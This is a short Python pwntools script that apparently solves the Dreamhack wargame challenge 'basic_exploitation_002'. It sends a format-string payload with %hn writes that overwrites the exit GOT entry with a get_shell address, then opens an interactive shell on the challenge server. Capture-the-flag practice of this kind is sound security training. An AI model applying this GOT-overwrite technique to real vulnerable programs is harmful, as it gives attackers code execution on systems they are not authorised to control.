#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./basic_exploitation_002")
p = process(elf.path)
p = remote("host3.dreamhack.games", 9385)

exit = elf.got["exit"]
get_shell = 0x8048609

pause()

# exit = 0x8609 exit + 2 = 0x0804
payload = p32(exit + 2) + p32(exit) + f'%{0x0804 - 0x8}c%1$hn'.encode() + f'%{0x8609 - 0x0804}c%2$hn'.encode() 
p.send(payload)

p.interactive()